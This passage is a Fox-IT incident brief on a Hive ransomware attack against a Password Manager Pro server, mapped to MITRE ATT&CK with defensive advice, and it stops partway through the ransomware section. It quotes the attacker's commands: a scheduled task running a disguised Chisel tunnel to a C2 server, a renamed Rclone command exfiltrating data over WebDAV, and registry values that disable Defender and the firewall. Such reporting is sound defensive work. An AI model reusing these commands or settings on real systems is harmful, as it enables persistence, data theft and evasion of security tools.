# Express Attack Brief 018
## Quadruple persistence for a Hive ransomware attack

**Version:** 1.0  
**Publication date:** 2023-02-17  
**Prepared for:** Fox-IT

---

## Table of contents

- [Document information](#document-information)
  - [Document purpose](#document-purpose)
  - [Document structure](#document-structure)
  - [Document classification](#document-classification)
- [1. Attack overview](#1-attack-overview)
  - [1.1. Attack description](#11-attack-description)
  - [1.2. Attack path summary](#12-attack-path-summary)
- [2. Attack path](#2-attack-path)
  - [2.1. Vulnerability in a Password Manager Pro instance exploited](#21-vulnerability-in-a-password-manager-pro-instance-exploited)
  - [2.2. Automatic privilege escalation](#22-automatic-privilege-escalation)
  - [2.3. Remote access using RDP](#23-remote-access-using-rdp)
  - [2.4. Network Discovery using Advanced IP Scanner](#24-network-discovery-using-advanced-ip-scanner)
  - [2.5. Network Discovery using ADfind](#25-network-discovery-using-adfind)
  - [2.6. Obtaining Domain Administrator credentials](#26-obtaining-domain-administrator-credentials)
  - [2.7. Installation of Cobalt Strike beacons](#27-installation-of-cobalt-strike-beacons)
  - [2.8. Installation of AnyDesk remote access software on multiple serves](#28-installation-of-anydesk-remote-access-software-on-multiple-serves)
  - [2.9. Installation attempts of another backdoor](#29-installation-attempts-of-another-backdoor)
  - [2.10. Data exfiltration using Rclone](#210-data-exfiltration-using-rclone)
  - [2.11. Disabling of Microsoft Defender using GPO's](#211-disabling-of-microsoft-defender-using-gpos)
  - [2.12. Rollout of the Hive ransomware](#212-rollout-of-the-hive-ransomware)
  - [2.13. Deletion of Windows Event Logs](#213-deletion-of-windows-event-logs)
- [3. MITRE ATT&CK TTPs](#3-mitre-attck-ttps)

---

## Document information

### Document purpose

This document has been prepared for Fox-IT.

This document describes the attack path observed during a recent cyber security incident. It presents the steps taken by the threat actor, including associated Tactic, Technique, and Procedure (TTP) details. Where possible the TTPs are expressed in MITRE ATT&CK terminology to aid in correlation and cross-referencing with other threat intelligence sources.

This document is aimed at helping readers learn from the incident and prepare to defend against possible future attacks. Its attack path structure is designed to show how the latest cyber attacks actually happen in the real world. The inclusion of TTP details allows readers to map the attack steps to their own organization, validating their security posture, and feeding into their risk management process.

### Document structure

**Chapter 1** describes the overall attack and gives a summary of the steps taken by the threat actor.

**Chapter 2** describes the attack steps in detail, including possible prevention and detection opportunities where appropriate.

**Chapter 3** lists the MITRE ATT&CK TTPs observed in the attack in a convenient table format.

### Document classification

This document is shared with Fox-IT as **TLP:AMBER** according to the Traffic Light Protocol (TLP). Recipients may only share this document with members of their own organization. Recipients may additionally share this document with their IT service providers for the sole purpose of validating or improving the security delivered to the recipients.

This document is classified as **RESTRICTED**. Any information published in this document is intended exclusively for Fox-IT. Any use by a party other than Fox-IT is prohibited unless explicitly granted by Fox-IT. The information contained in this document may be RESTRICTED in nature and fall under a pledge of secrecy.

Misuse of this document or any of its information is prohibited and will be prosecuted to the maximum penalty possible. Fox-IT cannot be held responsible for any misconduct or malicious use of this document by a third party or damage caused by its contained information.

---

## 1. Attack overview

### 1.1. Attack description

| **Timeframe** | 2023 Q1 |
|---|---|
| **Threat type** | Ransomware, Data Theft |
| **Sector relevance** | All sectors |
| **Geographic relevance** | Global |

This Express Attack Brief describes an attack on a Password Manager Pro server which allowed an adversary to gain access to a victim's network. After making sure for four times that the adversary maintained a foothold in the network, they deployed Hive ransomware on all servers in the Windows domain of the victim.

The Hive Ransomware-as-a-Service platform was taken down recently by the FBI. However, as ransomware groups often rise again and Tactics, Techniques and Procedures (TTP's) are copied from one group to another, it remains important to read about how an adversary sets out to compromise a network.

The multiple attempts to obtain persistence in combination with the long dwell time and break-in activity could indicate that the attack was not carried out by one distinct adversary. It could be that multiple operators were involved in the attack or that the access passed hands before it was used for the ransomware attack. However, these possibilities are unconfirmed. For the purpose of clarity we will describe the observed behaviour as carried out by one adversary, although there may have been multiple individuals or entities involved.

### 1.2. Attack path summary

| **Time** | **Tactic** | **Action** | **Target tech** |
|---|---|---|---|
| Day 1, 11:33 | Initial Access | Vulnerability in a Password Manager Pro instance exploited | Password Manager Pro |
| Day 32, 11:31 | Privilege Escalation | Automatic privilege escalation | Password Manager Pro |
| Day 32, 22:26 | Persistence | Remote access using RDP | Windows Server |
| Day 32, 22:42 | Discovery | Network Discovery using Advanced IP Scanner | Multiple |
| Day 36, 18:27 | Discovery | Network Discovery using ADfind | Active Directory |
| Day 84, 13:48 | Credential Access | Obtaining Domain Administrator credentials | Windows Server |
| Day 85, 18:33 | Persistence, Lateral Movement, Command and Control | Installation of Cobalt Strike beacons | Windows Server |
| Day 92, 07:24 | Persistence | Installation of AnyDesk remote access software on multiple serves | Windows Server |
| Day 120, 19:54 | Persistence | Installation attempts of another backdoor | Windows Server |
| Day 124, 22:35 | Exfiltration | Data exfiltration using Rclone | Windows Server |
| Day 124, 22:35 | Defense Evasion | Disabling of Microsoft Defender using GPO's | Windows Defender |
| Day 124, 00:24 | Impact | Rollout of the Hive ransomware | Windows |
| Day 124, 22:35 | Defense Evasion | Deletion of Windows Event Logs | Windows Server |

Times of day are expressed in the primary timezone of the victim organization where our incident response activities took place.

---

## 2. Attack path

This chapter describes the attack steps in detail, including possible prevention and detection opportunities where appropriate.

### 2.1. Vulnerability in a Password Manager Pro instance exploited

| **Timestamp** | Day 1, 11:33 |
|---|---|
| **Techniques** | T1190 Exploit Public-Facing Application to achieve TA0001 Initial Access |
| **Target tech** | Password Manager Pro |

ManageEngine Password Manager Pro (PMP) allows for the secure storage of passwords and other sensitive information. A major vulnerability, also referred to as CVE-2022-35405, was discovered in PMP and allowed for arbitrary code execution without the need of any authentication.

As ManageEngine was quick to patch the leak, the reporter of the vulnerability released a proof-of-concept (POC) to the public. As the victim had a server running PMP in its network - which was configured to be open to the internet and wasn't updated yet - the adversary was able to discover the server and gain access to it by exploiting the vulnerability.

In an effort to exploit the PMP service, an adversary would first check whether a server is vulnerable by sending POST requests to the potentially vulnerable part of the service. An example of such a request was found in the PMP logfiles of the victim and is depicted below.

```
3265:*REDACTED* - /xmlrpc POST [*REDACTED*:11:22:05 +0200] 46 269 200 "python-requests/2.28.1"
```

If such a request is successful, the adversary proceeds to exploit the service to gain access to the underlying system. In this case, the vulnerability in PMP was exploited multiple times. The following log entry is from a PMP logfile and indicates what is being logged when the service is exploited by an attacker.

```
1133:*REDACTED* [/xmlrpc-1661464213612_###_https-jsse-nio2-7272-exec-13] ERROR
org.apache.xmlrpc.server.XmlRpcErrorLogger-InvocationTargetException: java.lang.reflect
InvocationTargetException
```

#### Prevention

**Network Segmentation**  
Source: ATT&CK mitigation M1030 in the context of technique T1190

Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.

Segment externally facing servers and services from the rest of the network with a DMZ or on separate hosting infrastructure.

**Vulnerability Scanning**  
Source: ATT&CK mitigation M1016 in the context of technique T1190

Vulnerability scanning is used to find potentially exploitable software vulnerabilities to remediate them.

Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure. (OWASP: OWASP Top Ten Project, 2018-02-23)

**Update Software**  
Source: ATT&CK mitigation M1051 in the context of technique T1190

Perform regular software updates to mitigate exploitation risk.

Update software regularly by employing patch management for externally exposed applications.

#### Detection

**Monitor Application Log Content**  
Source: ATT&CK data component Application Log Content in the context of technique T1190

Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Web Application Firewalls may detect improper inputs attempting exploitation.

**Monitor Network Traffic Content**  
Source: ATT&CK data component Network Traffic Content in the context of technique T1190

Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection strings or known payloads.

### 2.2. Automatic privilege escalation

| **Timestamp** | Day 32, 11:31 |
|---|---|
| **Techniques** | T1068 Exploitation for Privilege Escalation to achieve TA0004 Privilege Escalation |
| **Target tech** | Password Manager Pro |

By exploiting the PMP service, the adversary gained access to the NT Authority\SYSTEM (hereinafter: SYSTEM) account as the service was running under that account. SYSTEM is the Windows account with the highest local privileges and it is not unusual for a service on Windows to be running under this account. In this particular case it meant that the attacker had access to the account with the highest local privileges from the time of exploitation.

#### Prevention

**Exploit Protection**  
Source: ATT&CK mitigation M1050 in the context of technique T1068

Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.

Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. (Nunez, N: Moving Beyond EMET II – Windows Defender Exploit Guard, 2017-08-09) Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. (Wikipedia: Control-flow integrity, 2018-01-11) Many of these protections depend on the architecture and target application binary for compatibility and may not work for software components targeted for privilege escalation.

**Update Software**  
Source: ATT&CK mitigation M1051 in the context of technique T1068

Perform regular software updates to mitigate exploitation risk.

Update software regularly by employing patch management for internal enterprise endpoints and servers.

**Threat Intelligence Program**  
Source: ATT&CK mitigation M1019 in the context of technique T1068

A threat intelligence program helps an organization generate their own threat intelligence information and track trends to inform defensive priorities to mitigate risk.

Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization.

**Application Isolation and Sandboxing**  
Source: ATT&CK mitigation M1048 in the context of technique T1068

Restrict execution of code to a virtual environment on or in transit to an endpoint system.

Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. (Goodin, D: Virtual machine escape fetches $105,000 at Pwn2Own hacking contest - updated, 2017-03-17)

**Execution Prevention**  
Source: ATT&CK mitigation M1038 in the context of technique T1068

Block execution of code on a system through application control, and/or script blocking.

Consider blocking the execution of known vulnerable drivers that adversaries may exploit to execute code in kernel mode. Validate driver block rules in audit mode to ensure stability prior to production deployment. (Microsoft: Microsoft recommended driver block rules, 2020-10-15)

### 2.3. Remote access using RDP

| **Timestamp** | Day 32, 22:26 |
|---|---|
| **Techniques** | T1133 External Remote Services to achieve TA0003 Persistence |
| **Tools** | RDP |
| **Target tech** | Windows Server |

Hours after initial access, the adversary engaged in setting up multiple local Microsoft Remote Desktop (hereinafter: RDP) sessions to the compromised server with the local Guest account.

The Windows Event Logs contained traces of the workstation name of the system the adversary used to set up these sessions. This was an autogenerated workstation name starting with WIN- followed by a random set of characters. As the victim adhered to a different naming convention for its systems, the client the adversary used to connect to the PMP server immediately stood out and could be used as an indicator of compromise to reveal other malicious activities during the incident. The use of local RDP sessions (from and back to the same server) and the Guest account are strong indications that the adversary used a network exploitation framework such as Metasploit, in order to achieve a graphical user interface on the server to conduct further activities.

#### Prevention

**Multi-factor Authentication**  
Source: ATT&CK mitigation M1032 in the context of technique T1133

Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.

Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of Multi-Factor Authentication Interception (T1111) techniques for some two-factor authentication implementations.

**Limit Access to Resource Over Network**  
Source: ATT&CK mitigation M1035 in the context of technique T1133

Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.

Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems.

#### Detection

**Monitor Network Traffic Flow**  
Source: ATT&CK data component Network Traffic Flow in the context of technique T1133

Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware.

**Monitor Logon Session Metadata**  
Source: ATT&CK data component Logon Session Metadata in the context of technique T1133

Follow best practices for detecting adversary use of Valid Accounts (T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.

**Monitor Application Log Content**  
Source: ATT&CK data component Application Log Content in the context of technique T1133

When authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.

**Monitor Network Connection Creation**  
Source: ATT&CK data component Network Connection Creation in the context of technique T1133

Monitor for newly constructed network connections that may use Valid Accounts to access and/or persist within a network using External Remote Services. Use of External Remote Services may be legitimate depending on the environment and how it's used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using External Remote Services.

**Monitor Network Traffic Content**  
Source: ATT&CK data component Network Traffic Content in the context of technique T1133

Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).

### 2.4. Network Discovery using Advanced IP Scanner

| **Timestamp** | Day 32, 22:42 |
|---|---|
| **Techniques** | T1046 Network Service Discovery to achieve TA0007 Discovery |
| **Tools** | RDP, Advanced IP Scanner |
| **Target tech** | Multiple |

During one of the RDP sessions mentioned earlier, the adversary used Advanced IP Scanner. This is a well-known tool used by administrators that allows for the collection of network information. However, the scanner is often abused by attackers to gather intel about which servers are available in a victim's network and to set out an attack path.

Fox-IT found no forensic traces relating to which network information was collected by the adversary.

#### Detection

**Monitor Network Traffic Flow**  
Source: ATT&CK data component Network Traffic Flow in the context of technique T1046

Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.

### 2.5. Network Discovery using ADfind

| **Timestamp** | Day 36, 18:27 |
|---|---|
| **Techniques** | T1087.002 Domain Account to achieve TA0007 Discovery |
| **Tools** | RDP, ADfind |
| **Target tech** | Active Directory |

After the network scan the adversary did not conduct any further activities until four days later. An RDP session was again set up to the victim's network. During this session the adversary used another reconnaissance tool, namely ADFind. ADFind allows a user to enumerate the Active Directory that, for instance, contains information about the users and groups in a Windows domain.

#### Prevention

**Operating System Configuration**  
Source: ATT&CK mitigation M1028 in the context of technique T1087.002

Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.

Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located at `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\CredUI\EnumerateAdministrators`. It can be disabled through GPO: Computer Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: Enumerate administrator accounts on elevation. (UCF: The system must require username and password to elevate a running application., 2017-12-18)

#### Detection

**Monitor Process Creation**  
Source: ATT&CK data component Process Creation in the context of technique T1087.002

Monitor for processes that can be used to enumerate domain accounts and groups, such as net.exe and net1.exe, especially when executed in quick succession. (Stepanic, D.: Embracing offensive tooling: Building detections against Koadic using EQL, 2020-01-13) Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

**Monitor Group Enumeration**  
Source: ATT&CK data component Group Enumeration in the context of technique T1087.002

Monitor for logging that may suggest a list of available groups and/or their associated settings has been extracted, ex. Windows EID 4798 and 4799.

**Monitor OS API Execution**  
Source: ATT&CK data component OS API Execution in the context of technique T1087.002

Monitor for API calls that may attempt to gather information about domain accounts such as type of user, privileges and groups.

### 2.6. Obtaining Domain Administrator credentials

| **Timestamp** | Day 84, 13:48 |
|---|---|
| **Techniques** | T1552.001 Credentials In Files to achieve TA0006 Credential Access |
| **Tools** | RDP |
| **Target tech** | Windows Server |

After the last reconnaissance action the adversary didn't reconnect to the victim's network until five weeks later. Windows Event Logs contained traces of a different user that was utilised to remotely connect to the PMP server, namely a domain administrator account.

Even though Fox-IT found no traces of credential access through for instance a memory dump, it did find that a text file was stored on the PMP server which contained the plaintext password of this account. It is likely that the adversary found these credentials during one of their earlier sessions.

Armed with credentials of a domain administrator account, the adversary had access to the account with the highest privileges in a Windows domain. What was earlier a compromise of a single server in the victim's network has now become a full domain compromise.

#### Prevention

**Audit**  
Source: ATT&CK mitigation M1047 in the context of technique T1552.001

Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.

Preemptively search for files containing passwords and take actions to reduce the exposure risk when found.

**Restrict File and Directory Permissions**  
Source: ATT&CK mitigation M1022 in the context of technique T1552.001

Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.

Restrict file shares to specific directories with access only to necessary users.

**Password Policies**  
Source: ATT&CK mitigation M1027 in the context of technique T1552.001

Set and enforce secure password policies for accounts.

Establish an organizational policy that prohibits password storage in files.

#### Detection

**Monitor Command Execution**  
Source: ATT&CK data component Command Execution in the context of technique T1552.001

While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor executed commands and arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See Valid Accounts (T1078) for more information.

### 2.7. Installation of Cobalt Strike beacons

| **Timestamp** | Day 85, 18:33 |
|---|---|
| **Techniques** | TA0003 Persistence (No specific technique)<br>TA0008 Lateral Movement (No specific technique)<br>TA0011 Command and Control (No specific technique) |
| **Tools** | Cobalt Strike |
| **Target tech** | Windows Server |

Logged in as the domain administrator the adversary installed several Cobalt Strike Beacons (hereinafter: Beacons) on multiple systems.

Beacons establish a communication channel between an adversary's Cobalt Strike command & control (C2) server and a compromised system. This allows for an attacker to quickly and effectively move between the systems on which these are installed. Beacons thus functioned as an extra form of persistence as it also allowed for the adversary to connect to a victim system from their infrastructure.

#### Prevention

**Antivirus/Antimalware**  
Source: ATT&CK mitigation M1049

Use signatures or heuristics to detect malicious software.

#### Detection

**Detect Cobalt Strike network communication**  
Implement robust detection of common Cobalt Strike communication patterns.

Even though Cobalt Strike is highly malleable, allowing adversaries to change most of its behavior including details of its network communication, telltale signs of its usage can often be found given the right level of security expertise and familiarity with the tool.

**Detect Cobalt Strike endpoint behavior**  
Implement robust detection of common Cobalt Strike behavior on endpoints.

Even though Cobalt Strike is highly malleable, allowing adversaries to change most of its behavior including details of its endpoint behavior, telltale signs of its presence can often be found given the right level of security expertise and familiarity with the tool.

### 2.8. Installation of AnyDesk remote access software on multiple serves

| **Timestamp** | Day 92, 07:24 |
|---|---|
| **Techniques** | T1133 External Remote Services to achieve TA0003 Persistence |
| **Tools** | AnyDesk |
| **Target tech** | Windows Server |

A week later the adversary returned and installed the remote access tool AnyDesk.

AnyDesk was installed using a PowerShell script named BanyD.ps1 and likely acted as a third layer of persistence. Fox-IT did not observe any traces of AnyDesk being used by the adversary during this incident. Furthermore, the BanyD.ps1 script also created a new malicious user and assigned local administrator privileges to it.

#### Prevention

**Limit Access to Resource Over Network**  
Source: ATT&CK mitigation M1035 in the context of technique T1133

Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.

Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems.

**Disable or Remove Feature or Program**  
Source: ATT&CK mitigation M1042 in the context of technique T1133

Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.

Disable or block remotely available services that may be unnecessary.

**Network Segmentation**  
Source: ATT&CK mitigation M1030 in the context of technique T1133

Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.

Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls.

#### Detection

**Monitor Application Log Content**  
Source: ATT&CK data component Application Log Content in the context of technique T1133

When authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.

**Monitor Network Connection Creation**  
Source: ATT&CK data component Network Connection Creation in the context of technique T1133

Monitor for newly constructed network connections that may use Valid Accounts to access and/or persist within a network using External Remote Services. Use of External Remote Services may be legitimate depending on the environment and how it's used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using External Remote Services.

**Monitor Network Traffic Content**  
Source: ATT&CK data component Network Traffic Content in the context of technique T1133

Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).

### 2.9. Installation attempts of another backdoor

| **Timestamp** | Day 120, 19:54 |
|---|---|
| **Techniques** | T1053.005 Scheduled Task to achieve TA0003 Persistence |
| **Tools** | Chisel Backdoor |
| **Target tech** | Windows Server |

After another break in activity, the adversary returned to the network and attempted to install another backdoor: Chisel. However, this backdoor was detected and stopped by Windows Defender.

Chisel is an open-source TCP tunnel that allows for, among other things, connections to a network environment. While the tool was originally developed for non-malicious purposes, it is regularly abused by adversaries to bypass firewalls and to maintain access to a network. It is unclear as to why the adversary installed multiple different persistent mechanisms as no traces were found that any of the previously installed persistence methods were noticed and removed by the victim.

In their first attempt, the adversary dropped an executable called finder.exe on a server. Fox-IT found that this executable was in fact a renamed version of the Chisel backdoor. Around the time of execution of finder.exe, Fox-IT discovered that a malicious scheduled task named GoogleUpdateTaskMachine was created. Analysis of the PowerShell history that was stored on the affected server uncovered the command that the attacker executed to create this scheduled task:

```
SCHTASKS /CREATE /RU SYSTEM /SC HOURLY /TN "GoogleUpdateTaskMachine" /TR "C:\\Programdata\\finder.exe client *REDACTED IP*:443 R:*REDACTED IP*:3331:socks" /ST 14:00
SCHTASKS /RUN /TN "GoogleUpdateTaskMachine"
```

The task aims to establish a Chisel tunnel between the compromised servers and a C2 server of the attacker. However, as described earlier, the backdoor was detected and deleted by Windows Defender.

After failing to establish the connection, the adversary tried again and was initially successful. However, after a day Windows Defender intervened once again which caused the connection to be disrupted.

#### Prevention

**Network Intrusion Prevention**  
Source: ATT&CK mitigation M1031 in the context of technique T1071

Use intrusion detection signatures to block traffic at network boundaries.

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.

#### Detection

**Monitor Network Traffic Content**  
Source: ATT&CK data component Network Traffic Content in the context of technique T1071

Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).

**Monitor Network Traffic Flow**  
Source: ATT&CK data component Network Traffic Flow in the context of technique T1071

Monitor and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).

**Monitor Scheduled Job Creation**  
Source: ATT&CK data component Scheduled Job Creation in the context of technique T1053

Monitor newly constructed scheduled jobs that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.

### 2.10. Data exfiltration using Rclone

| **Timestamp** | Day 124, 22:35 |
|---|---|
| **Techniques** | T1567.002 Exfiltration to Cloud Storage to achieve TA0010 Exfiltration |
| **Tools** | Rclone |
| **Target tech** | Windows Server |

The adversary used the application Rclone to exfiltrate a large amount of data from the file server located in the victim's environment to the attacker's infrastructure. Rclone is a legitimate application used to upload data to for instance a cloud instance. Like many of the applications mentioned earlier in this report, it is also often abused by adversaries.

Similar to the renamed Chisel backdoor, the adversary had chosen to rename the Rclone executable to svchost.exe (thus named after a legit, existing application on Windows) and to drop this renamed executable in the victim's infrastructure. The parameters that were used to execute the command to upload data to a server belonging to the adversary, indicated that this svchost.exe was actually rclone.exe.

The command to exfiltrate data is depicted below:

```
svchost.exe copy --transfers 15 --stats=1m --progress --exclude *.exe --exclude *.dll --exclude *.msi --exclude *.iso --no-check-certificate --webdav-url *REDACTED*/ --webdav-vendor other --webdav-user *REDACTED* --webdav-pass *REDACTED* "D:\\*REDACTED" :webdav:/*REDACTED*
```

#### Prevention

**Restrict Web-Based Content**  
Source: ATT&CK mitigation M1021 in the context of technique T1567.002

Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.

Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.

#### Detection

**Monitor Network Connection Creation**  
Source: ATT&CK data component Network Connection Creation in the context of technique T1567.002

Monitor for newly constructed network connections to cloud services associated with abnormal or non-browser processes.

**Monitor Network Traffic Flow**  
Source: ATT&CK data component Network Traffic Flow in the context of technique T1567.002

Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.

**Monitor File Access**  
Source: ATT&CK data component File Access in the context of technique T1567.002

Monitor for files being accessed to exfiltrate data to a cloud storage service rather than over their primary command and control channel.

### 2.11. Disabling of Microsoft Defender using GPO's

| **Timestamp** | Day 124, 22:35 |
|---|---|
| **Techniques** | T1562.001 Disable or Modify Tools to achieve TA0005 Defense Evasion |
| **Tools** | Group Policy Objects |
| **Target tech** | Windows Defender |

In preparation for the ransomware roll-out, the adversary modified an existing Group Policy Object to disable Windows Defender and the Windows firewall, and to configure systems to accept incoming RDP session requests. The adversary did so by adding a scheduled task with the name Google Update and by adding administrative templates to the GPO.

Fox-IT has identified which registry keys were changed because of the GPO modification. The following table contains an overview of these registry keys and their respected modifications.

| **Registry key** | **Value** | **Data / Action** |
|---|---|---|
| Software\Policies\Microsoft\Windows\System | GroupPolicyRefreshTime | 8 |
| Software\Policies\Microsoft\Windows\System | GroupPolicyRefreshTimeOffset | 2 |
| Software\Policies\Microsoft\Windows Defender | DisableAntiSpyware | 1 |
| Software\Policies\Microsoft\Windows Defender\Real-Time Protection | DisableRealtimeMonitoring | 1 |
| Software\Policies\Microsoft\Windows Defender\Spynet | DisableBlockAtFirstSeen | 1 |
| Software\Policies\Microsoft\Windows Defender\Spynet | SpynetReporting | DELETED |
| Software\Policies\Microsoft\Windows Defender\Spynet | LocalSettingOverrideSpynetReporting | 0 |
| Software\Policies\Microsoft\Windows Defender\Spynet | SubmitSamplesConsent | 2 |
| Software\Policies\Microsoft\Windows NT\Terminal Services | fDenyTSConnections | 0 |
| Software\Policies\Microsoft\WindowsFirewall | PolicyVersion | 538 |
| Software\Policies\Microsoft\WindowsFirewall\DomainProfile | EnableFirewall | 0 |
| Software\Policies\Microsoft\WindowsFirewall\PrivateProfile | EnableFirewall | 0 |
| Software\Policies\Microsoft\WindowsFirewall\PublicProfile | EnableFirewall | 0 |
| Software\Policies\Microsoft\Windows\Control Panel\Desktop | ScreenSaverIsSecure | 0 |
| Software\Policies\Microsoft\Windows\Control Panel\Desktop | ScreenSaveTimeOut | DELETED |
| Software\Policies\Microsoft\Windows\Control Panel\Desktop | ScreenSaveActive | 0 |
| Software\Policies\Microsoft\Windows NT\Terminal Services | MaxIdleTime | 1800000 |

#### Prevention

**User Account Management**  
Source: ATT&CK mitigation M1018 in the context of technique T1562.001

Manage the creation, modification, use, and permissions associated to user accounts.

Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.

**Restrict Registry Permissions**  
Source: ATT&CK mitigation M1024 in the context of technique T1562.001

Restrict the ability to modify certain hives or keys in the Windows Registry.

Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering with security services.

#### Detection

**Monitor Windows Registry Key Deletion**  
Source: ATT&CK data component Windows Registry Key Deletion in the context of technique T1562.001

Monitor for deletion of Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as `HKLM:\SOFTWARE\Microsoft\AMSI\Providers`.

**Monitor Driver Load**  
Source: ATT&CK data component Driver Load in the context of technique T1562.001

Monitor for unusual/suspicious driver activity, especially regarding EDR and drivers associated with security tools as well as those that may be abused to disable security products.

**Monitor Windows Registry Key Modification**  
Source: ATT&CK data component Windows Registry Key Modification in the context of technique T1562.001

Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as `HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender`.

**Monitor Process Termination**  
Source: ATT&CK data component Process Termination in the context of technique T1562.001

Monitor processes for unexpected termination related to security tools/services. Specifically, before execution of ransomware, monitor for rootkit tools, such as GMER, PowerTool or TDSSKiller, that may detect and terminate hidden processes and the host antivirus software.

**Monitor Host Status**  
Source: ATT&CK data component Host Status in the context of technique T1562.001

Lack of expected log events may be suspicious. Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux.

### 2.12. Rollout of the Hive ransomware

| **Timestamp** | Day 124, 00:24 |
|---|---|
| **Techniques** | T1486 Data Encrypted for Impact to achieve TA0040 Impact |
| **Tools** | Hive Ransomware |
| **Target tech** | Windows |

To stage the ransomware, the adversary created several malicious files on the infected systems. These concerned batchfiles named gp.bat and k.bat. These .bat files were created in the folder C:\Windows. Fox-IT was unable to verify the content of the .bat files as the adversary deleted these from the systems and thus were not part of the investigation material.

Following this, several files were created with a random file name. These files had the extension .key and were placed on the C:, D: or F: drives of the infected servers. From publicly available information, it follows that these .key files are created during the encryption process. These key files are needed for the decryption of the ransomware should a victim wish to pay the ransom.

Next, the adversary placed the ransomware executable on the systems in the victim's network and started the encryption process. Files that were encrypted received a file extension consisting of a random set of characters connected by an underscore character. The file extensions varied from file to file. Some examples of these extensions are shown below:

- .IxQkEFhK_879VTtQpl0Y
- .rlW4liBj_yHaKauzvGG4
- .Z14kAwLG_yrDkTpBdL2D
- .IxQkEFhK_7yNBvzldxZa
- .b8lyGIVB_9cJG0h4AnKv

After encryption was done a ransom note was placed on the impacted machines, containing a reference to the Hive ransomware gang.

#### Prevention

**Behavior Prevention on Endpoint**  
